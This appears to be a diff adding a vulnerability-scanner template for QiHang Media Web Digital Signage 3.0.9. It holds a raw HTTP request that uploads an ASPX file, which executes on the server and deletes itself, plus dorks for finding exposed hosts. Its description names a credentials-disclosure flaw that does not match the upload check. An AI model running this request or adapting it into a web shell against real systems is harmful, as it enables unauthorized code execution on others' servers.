@@ -1,0 +1,72 @@
+id: qihang-media-unauth-upload
+
+info:
+  name: QiHang Media Web Digital Signage 3.0.9 - unauth upload
+  author: qwtd
+  severity: critical
+  description: |
+    body="/images/qihang.ico" && region="Guangdong"
+    --dork-zoomeye subdivisions:"广东" +qihang.ico
+    QiHang Media Web Digital Signage 3.0.9 suffers from a clear-text credentials disclosure vulnerability that allows an unauthenticated attacker to issue a request to an unprotected directory that hosts an XML file /xml/User/User.xml and obtain administrative login information that allows for a successful authentication bypass attack.
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5579.php
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    max-request: 1
+  tags: Digital-Signage
+
+variables:
+  a1: "{{rand_base(6)}}"
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+
+http:
+  - raw:
+      - |
+        POST /QH.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Length: 1830
+
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="fileToUpload"; filename="{{a1}}.aspx"
+        Content-Type: application/octet-stream
+
+        <%@Page Language="C#" %>
+        <% Response.Write({{s1}}*{{s2}}); System.IO.File.Delete(Request.PhysicalPath); %>
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="action"
+
+        upload
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="responderId"
+
+        ResourceNewResponder
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="remotePath"
+
+        /opt/resources
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
+      - |
+        GET /opt/resources/{{a1}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: status_code_1
+
+      - type: word
+        part: body_2
+        words:
+          - "{{s1 * s2}}"
